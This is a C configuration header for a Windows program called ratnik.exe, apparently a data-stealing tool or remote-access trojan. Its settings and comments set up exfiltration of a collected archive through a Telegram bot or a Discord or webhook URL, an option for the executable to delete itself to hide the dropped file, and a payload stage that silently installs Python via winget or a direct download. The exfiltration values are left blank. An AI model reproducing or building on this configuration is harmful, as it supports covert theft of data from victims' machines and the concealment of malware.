// config.h — edit before build
#pragma once

// Telegram exfiltration (preferred). Leave empty to disable sending.
#define TG_BOT_TOKEN  ""
#define TG_CHAT_ID    ""

// Discord/generic webhook, used if TG is empty. Leave empty to disable.
#define WEBHOOK_URL   ""

// Delete ratnik.exe after a successful run (hides the dropped file).
#define SELF_DELETE   0

// If both exfil targets are empty the archive is only written to %TEMP%
// (or %RATNIK_OUT% if set) and nothing is sent.

// ------------------------------------------------------------------ payload
//
// The payload stage needs Python. If it is not installed, ratnik gets one shot
// at fetching it (winget, then the official installer) and if Python is still
// missing after PYTHON_ACQUIRE_TIMEOUT_MS the whole payload step is skipped.

#define PYTHON_ACQUIRE_TIMEOUT_MS  10000
#define PYTHON_AUTO_INSTALL        1

#define PYTHON_WINGET_ARGS  L"install --id Python.Python.3.12 -e --source winget --silent " \
                            L"--accept-package-agreements --accept-source-agreements " \
                            L"--disable-interactivity"

#define PYTHON_INSTALLER_URL L"https://www.python.org/ftp/python/3.12.10/python-3.12.10-amd64.exe"

// How long `pip install numpy` may take before the script is started anyway.
#define NUMPY_INSTALL_TIMEOUT_MS   60000
